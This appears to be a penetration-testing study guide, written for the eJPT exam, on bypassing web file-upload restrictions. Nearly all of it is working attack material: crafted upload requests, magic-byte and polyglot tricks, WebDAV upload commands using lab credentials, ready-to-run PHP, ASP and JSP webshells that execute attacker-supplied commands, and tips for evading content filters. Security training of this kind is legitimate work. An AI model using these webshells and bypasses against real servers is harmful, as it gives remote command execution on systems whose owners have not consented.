# üö´ File Upload Bypass Techniques

Comprehensive guide to bypassing file upload restrictions and security controls in web applications.

**Location in Framework:** `web-pentesting/file-upload/file-upload-bypass-techniques.md`

---

## üéØ Overview

File upload vulnerabilities occur when web applications allow users to upload files without proper validation. Attackers can bypass these restrictions using various techniques to upload malicious files like webshells.

---

## üîç Common Upload Restrictions

### 1. File Extension Filtering
- **Blacklist:** Blocks specific extensions (.php, .asp, .jsp)
- **Whitelist:** Only allows specific extensions (.jpg, .png, .txt)

### 2. MIME Type Validation  
- Checks Content-Type header
- Validates file signatures/magic bytes

### 3. File Size Restrictions
- Maximum file size limits
- Upload quota restrictions

### 4. File Content Scanning
- Antivirus scanning
- Content analysis and filtering

---

## üõ†Ô∏è Bypass Techniques

### 1. Extension-Based Bypasses

#### Double Extensions
```
shell.php.jpg
backdoor.asp.png
webshell.jsp.gif
```

#### Case Manipulation
```
shell.PHP
backdoor.Asp
webshell.AsP
```

#### Special Characters
```
shell.php%00.jpg    # Null byte injection
backdoor.asp.        # Trailing dot
webshell.php::$DATA  # NTFS Alternate Data Stream
```

#### Alternative Extensions
| Server Type | Alternative Extensions |
|-------------|------------------------|
| **PHP** | .php3, .php4, .php5, .phtml, .inc |
| **ASP** | .asa, .cer, .aspx |
| **JSP** | .jspx, .jspf |
| **Perl** | .pl, .pm, .cgi |

### 2. MIME Type Bypasses

#### Content-Type Manipulation
```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

#### Magic Byte Manipulation
```bash
# Add JPEG magic bytes before PHP code
printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01<?php system($_GET["cmd"]); ?>' > shell.php.jpg
```

### 3. WebDAV-Specific Bypasses

Based on the lab example with DAVTest and Cadaver:

#### Method-Based Bypass
```bash
# Use PUT method instead of POST
curl -X PUT --data-binary @shell.asp http://demo.ine.local/webdav/shell.txt
curl -X MOVE -H "Destination: /webdav/shell.asp" http://demo.ine.local/webdav/shell.txt
```

#### Directory Traversal in WebDAV
```bash
# Upload to different directories
cadaver http://demo.ine.local/webdav/
dav:/webdav/> put shell.asp ../../../inetpub/wwwroot/shell.asp
```

---

## üß™ Practical Lab Examples

### WebDAV IIS Server (From Lab Images)

**Scenario:** IIS server with WebDAV enabled, authentication required

#### Step 1: Test File Capabilities
```bash
davtest -auth bob:password_123321 -url http://demo.ine.local/webdav/
```

**Results:** ASP files can be uploaded and executed (PUT + EXEC = SUCCEED)

#### Step 2: Upload Webshell via Cadaver
```bash
cadaver http://demo.ine.local/webdav/
dav:/webdav/> put /usr/share/webshells/asp/webshell.asp
```

#### Step 3: Access Webshell
```
http://demo.ine.local/webdav/webshell.asp?cmd=whoami
```

### Common File Upload Bypass Scenarios

#### Scenario 1: Extension Blacklist
```
Target blocks: .php, .asp, .jsp
Bypass: Use .phtml, .asa, .jspx
```

#### Scenario 2: MIME Type Check Only
```
Upload: shell.php with Content-Type: image/jpeg  
Server validates MIME but ignores actual file content
```

#### Scenario 3: Client-Side Validation
```
Bypass JavaScript validation by intercepting with Burp Suite
Change file extension after client validation passes
```

---

## üîß Tools for File Upload Testing

### Manual Testing Tools
| Tool | Purpose | Usage |
|------|---------|--------|
| **Burp Suite** | Request manipulation | Intercept and modify upload requests |
| **OWASP ZAP** | Security scanning | Automated file upload testing |
| **Curl** | Command line HTTP | Manual PUT/POST requests |

### WebDAV-Specific Tools
| Tool | Purpose | Usage |
|------|---------|--------|
| **DAVTest** | Capability testing | `davtest -url http://target/webdav/` |
| **Cadaver** | File management | Interactive WebDAV client |
| **Nikto** | Vulnerability scanning | WebDAV enumeration |

---

## üìã Testing Methodology

### 1. Information Gathering
```bash
# Discover upload functionality
nmap --script http-enum -p 80,443 target.com
nikto -h http://target.com
```

### 2. Baseline Testing
```bash
# Test legitimate file upload
curl -F "file=@test.jpg" http://target.com/upload.php
```

### 3. Extension Testing
```bash
# Test various extensions
for ext in php php3 phtml asp aspx jsp; do
  cp webshell.php webshell.$ext
  curl -F "file=@webshell.$ext" http://target.com/upload.php
done
```

### 4. MIME Type Testing
```bash
# Test with different Content-Types
curl -F "file=@shell.php;type=image/jpeg" http://target.com/upload.php
```

---

## üö® Webshell Types and Usage

### ASP Webshells (IIS Servers)
```asp
<%
If Request.QueryString("cmd") <> "" Then
    Response.Write Server.CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.ReadAll
End If
%>
```

### PHP Webshells (Apache/Nginx)
```php
<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

### JSP Webshells (Tomcat)
```jsp
<%
if (request.getParameter("cmd") != null) {
    out.println(Runtime.getRuntime().exec(request.getParameter("cmd")));
}
%>
```

---

## üõ°Ô∏è Defense Evasion Techniques

### 1. Steganography
```bash
# Hide PHP code in image file
steghide embed -cf image.jpg -ef webshell.php
```

### 2. Archive Upload
```bash
# Upload ZIP containing webshell
zip payload.zip webshell.php
# Some applications auto-extract uploaded archives
```

### 3. Polyglot Files
```bash
# File that works as both image and script
echo -e '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x01\x00H\x00H\x00\x00\xFF\xFE\x00\x13Created with GIMP\xFF\xDB\x00C\x00' > polyglot.php
echo '<?php system($_GET["cmd"]); ?>' >> polyglot.php
```

---

## ‚ö†Ô∏è Common Pitfalls and Solutions

### Issue: Upload Successful but File Not Accessible
**Solutions:**
- Check file permissions
- Try different directories
- Verify web server configuration

### Issue: File Gets Renamed/Modified
**Solutions:**  
- Use WebDAV if available
- Try different upload methods (PUT vs POST)
- Check for auto-renaming patterns

### Issue: Content Filtering Blocks Upload
**Solutions:**
- Encode payload (base64, hex)
- Use obfuscation techniques
- Split payload across multiple files

---

## üéØ eJPT Exam Focus

### Key Concepts:
1. **WebDAV exploitation** - PUT method, authentication bypass
2. **File extension manipulation** - Double extensions, case changes
3. **MIME type bypasses** - Content-Type header manipulation
4. **Tool usage** - DAVTest, Cadaver, curl, Burp Suite

### Common Exam Scenarios:
- IIS server with WebDAV enabled
- Apache server with weak upload validation
- File upload forms with client-side filtering

---

## üìù Exploitation Workflow

### 1. Discovery
```bash
nmap --script http-enum target.com
```

### 2. Capability Testing
```bash
davtest -url http://target.com/webdav/
```

### 3. Authentication Testing
```bash
davtest -auth admin:admin -url http://target.com/webdav/
```

### 4. Webshell Upload
```bash
cadaver http://target.com/webdav/
dav:/webdav/> put webshell.asp
```

### 5. Verification and Exploitation
```bash
curl "http://target.com/webdav/webshell.asp?cmd=whoami"
```

---

## üîó Additional Resources

### Webshell Collections:
- `/usr/share/webshells/` (Kali Linux)
- SecLists webshell collection
- Custom webshells for specific scenarios

### Testing Platforms:
- DVWA (File Upload module)
- WebGoat file upload lessons
- VulnHub machines with upload vulnerabilities
